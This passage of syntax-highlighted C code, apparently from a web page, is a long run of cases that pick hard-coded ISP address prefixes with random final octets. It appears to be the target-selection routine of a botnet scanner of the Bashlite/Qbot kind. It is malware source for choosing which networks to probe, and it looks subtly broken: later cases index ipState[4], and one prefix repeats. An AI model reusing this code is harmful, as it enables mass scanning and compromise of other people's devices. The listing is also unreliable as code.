class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.55.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">124</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.220.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">125</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;183.233.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">126</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.242.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">127</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.198.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">128</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.14.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">129</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.195.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">130</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.203.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">131</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.214.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">132</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.218.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">133</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.225.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">134</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.228.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">135</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.231.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">136</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.60.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">137</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.248.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">138</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.253.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">139</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.255.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">140</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.176.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">141</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.175.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">142</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;203.134.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">143</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;203.210.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">144</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;117.176.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">145</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;117.171.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">146</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;117.162.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">147</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;203.150.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">148</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;157.119.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">149</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;43.228.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">150</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;162.12.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">151</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;115.220.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">152</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;125.114.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">153</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;112.5.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">154</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;117.165.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">155</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;85.3.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">156</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;37.158.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">157</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;95.9.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">158</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;41.252.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">159</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;58.71.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">160</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;104.55.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">161</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;78.186.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">162</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;78.189.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">163</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;221.120.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">164</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;88.5.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">165</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;41.254.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">166</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.20.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">167</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.47.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">168</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.57.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">169</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;45.117.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">170</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;101.51.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">171</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;137.59.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">172</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;1.56.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">173</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;1.188.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">174</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.204.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">175</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;27.0.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">176</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;27.8.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">177</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;27.50.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">178</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;27.54.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">179</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;27.98.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">180</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;27.112.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">181</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;27.192.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">182</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;36.32.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">183</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;36.248.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">184</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;39.64.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">185</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;42.4.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">186</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;42.48.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">187</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;42.52.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">188</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;42.56.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">189</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;42.63.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">190</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;42.84.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">191</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;42.176.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">192</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;42.224.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">193</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;42.176.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">194</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;60.0.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">195</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;60.16.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">196</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;163.53.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">197</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;62.30.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">198</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;62.252.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">199</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;62.254.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">200</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;62.255.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">201</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;77.96.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">202</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;77.97.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">203</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;77.98.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">204</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;77.100.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">205</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;77.102.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">206</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.191.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">207</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;81.100.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">208</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.188.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">209</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.189.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">210</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;94.174.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">211</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.160.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">212</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.161.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">213</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.162.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">214</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.163.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">215</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.164.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">216</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.165.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">217</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.166.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">218</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.167.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">219</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.168.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">220</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.169.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">221</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.170.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">222</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.171.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">223</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.172.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">224</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.173.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">225</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.174.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">226</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.175.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">227</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.176.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">228</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.177.%d.%d&quot;</span>, ipState[<span class="number">3</span>], ipState[<span 